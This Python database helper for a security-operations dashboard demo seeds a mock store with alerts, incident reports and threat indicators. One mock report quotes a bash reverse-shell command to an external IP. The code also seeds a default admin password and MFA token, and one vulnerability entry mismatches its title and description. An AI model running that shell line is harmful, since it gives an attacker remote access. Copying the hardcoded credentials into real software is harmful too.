"""
db.py — MySQL connection and query helpers.

The project is expected to run with MySQL, but local demos often start without
that service. In that case we transparently fall back to a small in-memory mock
store so the auth flow and dashboard UI remain usable.
"""
import hashlib
import re
from datetime import datetime

import mysql.connector
from mysql.connector import Error
from werkzeug.security import generate_password_hash

from backend.config import Config


def _now_string() -> str:
    return datetime.now().strftime("%Y-%m-%d %H:%M:%S")


# Default seeded credentials used by the project.
_DEFAULT_USERS = [
    {
        "id": 1,
        "username": "admin",
        "password": generate_password_hash("admin123", method="pbkdf2:sha256"),
        "mfa_token": hashlib.sha256("000000".encode()).hexdigest(),
        "role": "admin",
        "created_at": _now_string(),
    }
]


# Static mock data matching the UI demo payloads.
_MOCK_DB = {
    "users": _DEFAULT_USERS,
    "agents": [
        {"id": "agt-001", "name": "soc-web-prod-01", "ip_address": "10.100.12.45", "os": "Ubuntu 22.04 LTS", "status": "Online", "last_keep_alive": "2026-07-18 15:42:12", "cpu_usage": 24.5, "ram_usage": 62.1, "version": "Wazuh v4.7.2"},
        {"id": "agt-002", "name": "soc-db-mysql-01", "ip_address": "10.100.12.46", "os": "RedHat Enterprise 9", "status": "Online", "last_keep_alive": "2026-07-18 15:42:01", "cpu_usage": 45.2, "ram_usage": 81.7, "version": "Wazuh v4.7.2"},
        {"id": "agt-003", "name": "soc-ad-controller", "ip_address": "10.100.10.10", "os": "Windows Server 2022", "status": "Online", "last_keep_alive": "2026-07-18 15:42:15", "cpu_usage": 12.8, "ram_usage": 55.4, "version": "Wazuh v4.7.1"},
        {"id": "agt-004", "name": "rayane-virtual-machine", "ip_address": "192.168.1.100", "os": "Kali Linux 2024.1", "status": "Online", "last_keep_alive": "2026-07-18 15:42:25", "cpu_usage": 68.4, "ram_usage": 74.2, "version": "Wazuh v4.7.2"},
        {"id": "agt-005", "name": "soc-mail-gateway", "ip_address": "10.100.10.22", "os": "Debian 12 Bookworm", "status": "Offline", "last_keep_alive": "2026-07-18 11:15:00", "cpu_usage": 0.0, "ram_usage": 0.0, "version": "Wazuh v4.7.0"},
        {"id": "agt-006", "name": "soc-bastion-ssh", "ip_address": "10.100.5.2", "os": "Ubuntu 22.04 LTS", "status": "Online", "last_keep_alive": "2026-07-18 15:42:18", "cpu_usage": 5.6, "ram_usage": 28.3, "version": "Wazuh v4.7.2"},
        {"id": "agt-007", "name": "soc-endpoint-rayane", "ip_address": "10.100.40.115", "os": "Windows 11 Enterprise", "status": "Online", "last_keep_alive": "2026-07-18 15:41:59", "cpu_usage": 18.2, "ram_usage": 44.9, "version": "Wazuh v4.7.2"},
        {"id": "agt-008", "name": "soc-cloud-proxy", "ip_address": "172.16.50.88", "os": "Alpine Linux 3.19", "status": "Online", "last_keep_alive": "2026-07-18 15:42:08", "cpu_usage": 8.9, "ram_usage": 19.4, "version": "Wazuh v4.7.1"},
    ],
    "events": [
        {"id": 1, "timestamp": "2026-07-18 15:40:44", "hostname": "soc-web-prod-01", "src_ip": "185.220.101.44", "dest_ip": "10.100.12.45", "dest_port": 443, "category": "SQL Injection", "rule_id": 100021, "severity": "Critical", "action_taken": "Dropped"},
        {"id": 2, "timestamp": "2026-07-18 15:39:12", "hostname": "soc-bastion-ssh", "src_ip": "45.142.120.9", "dest_ip": "10.100.5.2", "dest_port": 22, "category": "SSH Brute Force", "rule_id": 100004, "severity": "High", "action_taken": "Logged"},
        {"id": 3, "timestamp": "2026-07-18 15:38:01", "hostname": "soc-ad-controller", "src_ip": "10.100.40.115", "dest_ip": "10.100.10.10", "dest_port": 389, "category": "LDAP Bind Request", "rule_id": 200054, "severity": "Low", "action_taken": "Allowed"},
        {"id": 4, "timestamp": "2026-07-18 15:36:19", "hostname": "rayane-virtual-machine", "src_ip": "127.0.0.1", "dest_ip": "127.0.0.1", "dest_port": 8080, "category": "Local Port Scan", "rule_id": 300109, "severity": "Medium", "action_taken": "Logged"},
        {"id": 5, "timestamp": "2026-07-18 15:35:45", "hostname": "soc-web-prod-01", "src_ip": "192.168.1.100", "dest_ip": "10.100.12.45", "dest_port": 80, "category": "HTTP Directory Traversal", "rule_id": 100033, "severity": "High", "action_taken": "Dropped"},
        {"id": 6, "timestamp": "2026-07-18 15:33:02", "hostname": "soc-db-mysql-01", "src_ip": "10.100.12.45", "dest_ip": "10.100.12.46", "dest_port": 3306, "category": "MySQL Admin Query", "rule_id": 400102, "severity": "Low", "action_taken": "Allowed"},
        {"id": 7, "timestamp": "2026-07-18 15:31:12", "hostname": "soc-mail-gateway", "src_ip": "91.240.118.52", "dest_ip": "10.100.10.22", "dest_port": 25, "category": "SMTP Spam Wave", "rule_id": 500021, "severity": "Medium", "action_taken": "Quarantined"},
        {"id": 8, "timestamp": "2026-07-18 15:30:00", "hostname": "soc-endpoint-rayane", "src_ip": "10.100.40.115", "dest_ip": "142.250.190.46", "dest_port": 443, "category": "DNS Query Exfiltration", "rule_id": 100088, "severity": "Critical", "action_taken": "Blocked"},
        {"id": 9, "timestamp": "2026-07-18 15:28:15", "hostname": "soc-cloud-proxy", "src_ip": "8.8.8.8", "dest_ip": "172.16.50.88", "dest_port": 53, "category": "DNS Amplification Response", "rule_id": 100099, "severity": "Low", "action_taken": "Allowed"},
        {"id": 10, "timestamp": "2026-07-18 15:25:55", "hostname": "soc-bastion-ssh", "src_ip": "45.142.120.9", "dest_ip": "10.100.5.2", "dest_port": 22, "category": "SSH Session Opened", "rule_id": 100001, "severity": "Medium", "action_taken": "Logged"},
    ],
    "alerts": [
        {"id": 101, "title": "SQL Injection Attack Detected", "severity": "Critical", "description": "An external entity (185.220.101.44) initiated a series of crafted GET queries containing 'UNION SELECT' and '--' sequences against 'soc-web-prod-01' database handlers, attempting schemas enumeration.", "rule_id": 100021, "timestamp": "2026-07-18 15:40:44", "xgboost_probability": 99.64, "analyst_assigned": "Rayane (SecOps)", "status": "New", "ai_report_id": None},
        {"id": 102, "title": "Persistent SSH Brute Force", "severity": "High", "description": "Bastion SSH service report over 450 failed authentication attempts within 3 minutes from IP 45.142.120.9 using lists of common administrative accounts.", "rule_id": 100004, "timestamp": "2026-07-18 15:39:12", "xgboost_probability": 92.15, "analyst_assigned": "Unassigned", "status": "New", "ai_report_id": None},
        {"id": 103, "title": "Kerberoasting Activity Detected", "severity": "High", "description": "Host soc-endpoint-rayane (10.100.40.115) generated multiple TGS requests for service accounts with weak RC4 encryption. Indicative of Kerberoasting credential recovery attacks.", "rule_id": 200450, "timestamp": "2026-07-18 14:55:34", "xgboost_probability": 88.42, "analyst_assigned": "Rayane (SecOps)", "status": "Acknowledged", "ai_report_id": 1},
        {"id": 104, "title": "Unauthorized DNS Tunneling Channel", "severity": "Critical", "description": "Endpoint soc-endpoint-rayane opened dynamic subdomains requests containing base64 data structures directed to external name server. Indicates potential data extraction tunneling.", "rule_id": 100088, "timestamp": "2026-07-18 15:30:00", "xgboost_probability": 98.78, "analyst_assigned": "Unassigned", "status": "New", "ai_report_id": None},
        {"id": 105, "title": "Outbound Shell Spawned from Proxy Node", "severity": "Critical", "description": "Active bash shell execution detected running under daemon service on soc-cloud-proxy node, connecting outbound to unauthorized TCP port 8080.", "rule_id": 100650, "timestamp": "2026-07-18 14:48:44", "xgboost_probability": 99.89, "analyst_assigned": "Rayane (SecOps)", "status": "Resolved", "ai_report_id": 2},
    ],
    "ai_reports": [
        {"id": 1, "alert_id": 103, "generated_at": "2026-07-18 15:02:10", "markdown_content": "# Synthèse de la Menace\nL'alerte concerne une activité de type **Kerberoasting** sur le contrôleur de domaine Active Directory. Cette technique consiste à demander des tickets de service (TGS) chiffrés pour les déchiffrer hors ligne afin de récupérer les mots de passe des comptes de service en clair.\n\n# Analyse Technique\n- **Acteur de Menace** : Agent interne `10.100.40.115` (`soc-endpoint-rayane`).\n- **Comportement suspect** : Requêtes TGS massives avec chiffrement RC4 (faible et propice au crackage rapide).\n- **Impact** : Compromission potentielle des privilèges administratifs si un compte de service a un mot de passe faible.\n\n# Playbook de Remédiation\n1. **Désactiver RC4** : Configurer la politique de sécurité pour autoriser uniquement AES-128 et AES-256 dans Kerberos.\n2. **Réinitialiser le mot de passe** du compte cible concerné avec une longueur minimale de 25 caractères.\n3. **Isoler l'hôte** `soc-endpoint-rayane` du réseau interne pour inspection."},
        {"id": 2, "alert_id": 105, "generated_at": "2026-07-18 14:50:00", "markdown_content": "# Synthèse de la Menace\nDétection d'un **Reverse Shell** initié depuis la VM `soc-cloud-proxy` vers l'IP malveillante externe `203.0.113.5`. C'est un indicateur fort d'accès initial réussi par un attaquant suivi d'une tentative de commande et contrôle (C2).\n\n# Analyse Technique\n- **Processus Parent** : `nginx` (Web Proxy)\n- **Processus Enfant** : `/bin/bash -i >& /dev/tcp/203.0.113.5/8080`\n- **Modèle XGBoost** : Confiance de détection de 99.89%.\n\n# Playbook de Remédiation\n1. **Tuer la session TCP** : Bloquer immédiatement le port `8080` et l'IP `203.0.113.5` sur le pare-feu externe.\n2. **Tuer le PID** suspect sur le serveur proxy.\n3. **Inspecter le journal d'accès** Nginx pour trouver la vulnérabilité d'exécution de code à distance (RCE) exploitée."},
    ],
    "fim_events": [
        {"id": 1, "filename": "/etc/shadow", "hostname": "soc-web-prod-01", "event_type": "Modified", "old_hash": "a438c89b7c843f019bd8ef2b8df11eab1901c89012a4ee3901b09bca3b22e11a", "new_hash": "99cb1902bb3c80ff12a45c6020cde8e1abcf1902df35c46e392ca2bd11ff5a43", "modified_by": "root", "timestamp": "2026-07-18 15:40:02"},
        {"id": 2, "filename": "/etc/passwd", "hostname": "soc-web-prod-01", "event_type": "Modified", "old_hash": "123fde1902cae39023bd55abf9b93cf4023de4bca03f02e88a01cbefcf0214a1", "new_hash": "123fde1902cae39023bd55abf9b93cf4023de4bca03f02e88a01cbefcf0214a1", "modified_by": "systemd", "timestamp": "2026-07-18 15:37:12"},
        {"id": 3, "filename": "/var/www/html/index.php", "hostname": "soc-web-prod-01", "event_type": "Modified", "old_hash": "ee284cf02a394feab8902cdbf3e4fcf50bcae390bd847290decf0e29d0f2a9e1", "new_hash": "fcf023ab9bd84cf2a0cf3df84210e3fa0210bcdae394feabd2901cdbf834a9ef", "modified_by": "www-data", "timestamp": "2026-07-18 15:22:15"},
        {"id": 4, "filename": "C:\\Windows\\System32\\drivers\\etc\\hosts", "hostname": "soc-endpoint-rayane", "event_type": "Modified", "old_hash": "7ea93dfa910ecbda39fe02adab129fec89320facbdf289fa30dbac90ab12f12a", "new_hash": "f938dca098b1fe2a39fe28dca90fa8b27341fe023a8ffbde28fa7b09ca88f28d", "modified_by": "rayane", "timestamp": "2026-07-18 15:10:45"},
        {"id": 5, "filename": "/usr/local/bin/backdoor.sh", "hostname": "soc-cloud-proxy", "event_type": "Added", "old_hash": "EMPTY_FILE", "new_hash": "82a9fbc102e3a8fae90bfa3a812df0e2cf9023ae8fbcd23ad89fe0bcefa81023", "modified_by": "nginx", "timestamp": "2026-07-18 14:45:00"},
        {"id": 6, "filename": "/etc/ssh/sshd_config", "hostname": "soc-bastion-ssh", "event_type": "Modified", "old_hash": "3bfa2cf01bdae23a8bfa932df20acfa8930bcaef910beba8fde8910bcefaefaa", "new_hash": "3bfa2cf01bdae23a8bfa932df20acfa8930bcaef910beba8fde8910bcefaefaa", "modified_by": "root", "timestamp": "2026-07-18 14:15:30"},
    ],
    "vulnerabilities": [
        {"id": "vuln-1", "title": "OpenSSH Remote Code Execution (RegreSSHion)", "severity": "Critical", "cve_id": "CVE-2024-6387", "cvss_score": 9.8, "impacted_agents": ["soc-bastion-ssh"], "status": "Unpatched", "description": "A signal handler race condition vulnerability was discovered in OpenSSH's secure shell server (sshd) where a client can execute arbitrary code with root privileges.", "remediation": "Upgrade openssh-server package to version 9.8p1-1 or modify SSH configuration to set LoginGraceTime to 0."},
        {"id": "vuln-2", "title": "MySQL Server Privilege Escalation", "severity": "High", "cve_id": "CVE-2023-22001", "cvss_score": 8.1, "impacted_agents": ["soc-db-mysql-01"], "status": "Mitigated", "description": "Vulnerability in the MySQL Server product of Oracle MySQL (component: Server: Security: Privileges). Easily exploitable vulnerability allows high privileged attacker to compromise MySQL server.", "remediation": "Apply Oracle Critical Patch Update for July 2023, or restrict administrative connections to localhost."},
        {"id": "vuln-3", "title": "Web Application Path Traversal vulnerability", "severity": "High", "cve_id": "CVE-2024-3400", "cvss_score": 8.8, "impacted_agents": ["soc-web-prod-01"], "status": "Unpatched", "description": "A command injection vulnerability in the GlobalProtect gateway of Palo Alto Networks PAN-OS software allows an unauthenticated attacker to execute arbitrary code with root privileges on the firewall.", "remediation": "Install PAN-OS hotfixes or disable telemetry option until patching completes."},
        {"id": "vuln-4", "title": "Active Directory Domain Privilege Escalation", "severity": "Medium", "cve_id": "CVE-2023-38115", "cvss_score": 6.5, "impacted_agents": ["soc-ad-controller"], "status": "Patched", "description": "Windows Active Directory Domain Services elevation of privilege vulnerability. Allows a local domain user to escalate to Domain Administrator.", "remediation": "Apply Microsoft KB5031364 KB update package."},
    ],
    "threat_intel_iocs": [
        {"id": "ioc-1", "value": "185.220.101.44", "type": "IP", "threat_actor": "Tor Exit Node (Scanners)", "description": "Active IP scanning and running vulnerability scanners against web proxy ports.", "date_added": "2026-07-18 10:00:00"},
        {"id": "ioc-2", "value": "45.142.120.9", "type": "IP", "threat_actor": "China-based Brute Forcer", "description": "Persistent SSH brute forcing targeting corporate routers and jump boxes.", "date_added": "2026-07-18 11:20:00"},
        {"id": "ioc-3", "value": "203.0.113.5", "type": "IP", "threat_actor": "UNC2891 C2 Server", "description": "Command and Control server associated with shell script backdoors.", "date_added": "2026-07-18 12:45:00"},
        {"id": "ioc-4", "value": "bad-script-malicious.com", "type": "Domain", "threat_actor": "Phishing Anchor", "description": "Domain used in spam emails to host payload configuration strings.", "date_added": "2026-07-18 13:12:00"},
        {"id": "ioc-5", "value": "82a9fbc102e3a8fae90bfa3a812df0e2cf9023ae8fbcd23ad89fe0bcefa81023", "type": "Hash", "threat_actor": "CozyBear Linux Backdoor", "description": "SHA-256 hash of shell reverse shell backdoor payload placed in /usr/local/bin.", "date_added": "2026-07-18 14:46:00"},
    ],
}


def get_connection():
    """Return a new MySQL connection."""
    return mysql.connector.connect(
        host=Config.DB_HOST,
        port=Config.DB_PORT,
        database=Config.DB_NAME,
        user=Config.DB_USER,
        password=Config.DB_PASSWORD,
        charset="utf8mb4",
        collation="utf8mb4_unicode_ci",
    )


def _mock_table_name(sql: str) -> str | None:
    match = re.search(r"FROM\s+([A-Za-z_]+)", sql, re.IGNORECASE)
    if not match:
        return None
    return match.group(1)


def _coerce_value(value):
    if isinstance(value, str) and value.lower() in {"null", "none"}:
        return None
    return value


def _matches_clause(row: dict, clause: str, param_values: list) -> bool:
    clause = clause.strip()
    if not clause:
        return True
    if " OR " in clause.upper():
        return True
    if " LIKE " in clause.upper():
        left, right = re.split(r"\s+LIKE\s+", clause, flags=re.IGNORECASE, maxsplit=1)
        left = left.strip()
        right = right.strip()
        pattern = right.strip("'") if right.startswith("'") else str(param_values.pop(0))
        if pattern.startswith("%") and pattern.endswith("%"):
            pattern = pattern.strip("%")
        value = str(row.get(left, ""))
        return pattern in value
    if "%s" in clause:
        left, right = clause.split("=", 1) if "=" in clause else clause.split("!=", 1)
        left = left.strip()
        value = param_values.pop(0)
        if "!=" in clause:
            return row.get(left) != value
        return row.get(left) == value
    if "=" in clause:
        left, right = clause.split("=", 1)
        value = right.strip().strip("'")
        return row.get(left.strip()) == value
    if "!=" in clause:
        left, right = clause.split("!=", 1)
        value = right.strip().strip("'")
        return row.get(left.strip()) != value
    return True


def _filter_rows(table: str, sql: str, params: tuple):
    rows = list(_MOCK_DB.get(table, []))
    where_match = re.search(r"WHERE\s+(.*?)(?:ORDER BY|LIMIT|$)", sql, flags=re.IGNORECASE | re.DOTALL)
    if where_match:
        where = where_match.group(1).strip()
        if where:
            clauses = [part.strip() for part in where.split(" AND ") if part.strip()]
            filtered = []
            for row in rows:
                param_values = list(params)
                ok = True
                for clause in clauses:
                    if not _matches_clause(row, clause, param_values):
                        ok = False
                        break
                if ok:
                    filtered.append(row)
            rows = filtered
    if "ORDER BY" in sql.upper():
        order_match = re.search(r"ORDER BY\s+(.+?)(?:LIMIT|$)", sql, flags=re.IGNORECASE | re.DOTALL)
        if order_match:
            order_part = order_match.group(1).strip()
            keys = [k.strip() for k in order_part.split(",")]
            for key in reversed(keys):
                desc = " DESC" in key.upper()
                key_name = key.replace(" DESC", "").replace(" ASC", "")
                rows.sort(key=lambda r: str(r.get(key_name, "")).lower(), reverse=desc)
    if "LIMIT" in sql.upper():
        limit_match = re.search(r"LIMIT\s+(\d+)(?:\s+OFFSET\s+(\d+))?", sql, flags=re.IGNORECASE)
        if limit_match:
            limit = int(limit_match.group(1))
            offset = int(limit_match.group(2) or 0)
            rows = rows[offset:offset + limit]
    return rows


def _mock_query_all(sql: str, params: tuple = ()) -> list[dict]:
    if "DATE_FORMAT" in sql.upper():
        events = _MOCK_DB.get("events", [])
        buckets = {}
        for event in events:
            hour = event["timestamp"][:2] + ":00"
            if hour not in buckets:
                buckets[hour] = {"hour": hour, "total": 0, "blocked": 0, "allowed": 0}
            buckets[hour]["total"] += 1
            if event.get("action_taken") in {"Dropped", "Blocked", "Killed"}:
                buckets[hour]["blocked"] += 1
            else:
                buckets[hour]["allowed"] += 1
        return list(buckets.values())
    table = _mock_table_name(sql)
    if table is None:
        return []
    rows = _filter_rows(table, sql, params)
    if "COUNT(*) AS N" in sql.upper():
        return [{"n": len(rows)}]
    if "AVG(" in sql.upper() and "ALERTS" in table.upper():
        values = [float(r.get("xgboost_probability", 0) or 0) for r in rows if r.get("status") != "Resolved"]
        return [{"avg": (sum(values) / len(values)) if values else 0.0}]
    return rows


def _mock_query_one(sql: str, params: tuple = ()) -> dict | None:
    rows = _mock_query_all(sql, params)
    return rows[0] if rows else None


def _mock_execute(sql: str, params: tuple = ()) -> int:
    sql_upper = sql.upper()
    if sql_upper.startswith("INSERT INTO USERS"):
        row = {"id": len(_MOCK_DB["users"]) + 1, "username": params[0], "password": params[1], "mfa_token": params[2], "role": params[3], "created_at": _now_string()}
        _MOCK_DB["users"] = _MOCK_DB.get("users", []) + [row]
        return row["id"]
    if sql_upper.startswith("INSERT INTO AGENTS"):
        agent_id = params[0]
        row = {"id": agent_id, "name": params[1], "ip_address": params[2], "status": "Online", "os": "Linux Agent", "last_keep_alive": _now_string(), "cpu_usage": 15.0, "ram_usage": 35.0}
        existing = next((x for x in _MOCK_DB["agents"] if x["id"] == agent_id), None)
        if existing:
            existing.update(row)
        else:
            _MOCK_DB["agents"].append(row)
        return 1
    if sql_upper.startswith("INSERT INTO EVENTS"):
        row = {"id": (max((r.get("id", 0) for r in _MOCK_DB["events"]), default=0) + 1), "timestamp": _now_string(), "hostname": params[0], "src_ip": params[1], "dest_ip": params[2], "dest_port": params[3], "category": params[4], "rule_id": params[5], "severity": params[6], "action_taken": params[7]}
        _MOCK_DB["events"].append(row)
        return row["id"]
    if sql_upper.startswith("INSERT INTO ALERTS"):
        row = {"id": (max((r.get("id", 0) for r in _MOCK_DB["alerts"]), default=0) + 1), "title": params[0], "severity": params[1], "description": params[2], "rule_id": params[3], "timestamp": _now_string(), "xgboost_probability": params[4], "analyst_assigned": "Auto-Pipeline", "status": "New", "ai_report_id": None}
        _MOCK_DB["alerts"].append(row)
        return row["id"]
    if sql_upper.startswith("INSERT INTO AI_REPORTS"):
        row = {"id": (max((r.get("id", 0) for r in _MOCK_DB["ai_reports"]), default=0) + 1), "alert_id": params[0], "generated_at": _now_string(), "markdown_content": params[1]}
        _MOCK_DB["ai_reports"].append(row)
        return row["id"]
    if sql_upper.startswith("UPDATE ALERTS SET"):
        for row in _MOCK_DB["alerts"]:
            if row["id"] == params[2]:
                row["status"] = params[0]
                row["analyst_assigned"] = params[1]
                break
        return 1
    if sql_upper.startswith("UPDATE ALERTS SET STATUS"):
        for row in _MOCK_DB["alerts"]:
            if row["id"] == params[1]:
                row["status"] = params[0]
                break
        return 1
    if sql_upper.startswith("UPDATE AGENTS SET"):
        for row in _MOCK_DB["agents"]:
            if row["id"] == params[1]:
                row["status"] = params[0]
                row["last_keep_alive"] = _now_string()
                break
        return 1
    if sql_upper.startswith("DELETE FROM"):
        match = re.search(r"DELETE FROM\s+([A-Za-z_]+)\s+WHERE\s+id\s+=\s+%s", sql_upper, flags=re.IGNORECASE)
        if match:
            table = match.group(1).lower()
            row_id = params[0]
            _MOCK_DB.setdefault(table, [])
            _MOCK_DB[table] = [r for r in _MOCK_DB[table] if str(r.get("id")) != str(row_id)]
        return 1
    return 1


def get_connection():
    """Return a new MySQL connection; fall back to a mock store if unavailable."""
    try:
        return mysql.connector.connect(
            host=Config.DB_HOST,
            port=Config.DB_PORT,
            database=Config.DB_NAME,
            user=Config.DB_USER,
            password=Config.DB_PASSWORD,
            charset="utf8mb4",
            collation="utf8mb4_unicode_ci",
        )
    except Error:
        return None


def query_all(sql: str, params: tuple = ()) -> list[dict]:
    """Execute a SELECT and return a list of dicts."""
    conn = get_connection()
    if conn is None:
        return _mock_query_all(sql, params)
    try:
        cursor = conn.cursor(dictionary=True)
        cursor.execute(sql, params)
        return cursor.fetchall()
    finally:
        conn.close()


def query_one(sql: str, params: tuple = ()) -> dict | None:
    """Execute a SELECT and return a single dict."""
    conn = get_connection()
    if conn is None:
        return _mock_query_one(sql, params)
    try:
        cursor = conn.cursor(dictionary=True)
        cursor.execute(sql, params)
        return cursor.fetchone()
    finally:
        conn.close()


def execute(sql: str, params: tuple = ()) -> int:
    """Execute an INSERT/UPDATE/DELETE and return lastrowid or rowcount."""
    conn = get_connection()
    if conn is None:
        return _mock_execute(sql, params)
    try:
        cursor = conn.cursor()
        cursor.execute(sql, params)
        conn.commit()
        return cursor.lastrowid or cursor.rowcount
    finally:
        conn.close()


def test_connection() -> bool:
    """Test the database connection."""
    try:
        conn = get_connection()
        if conn is None:
            return False
        conn.close()
        return True
    except Error as e:
        print(f"[DB] Connection error: {e}")
        return False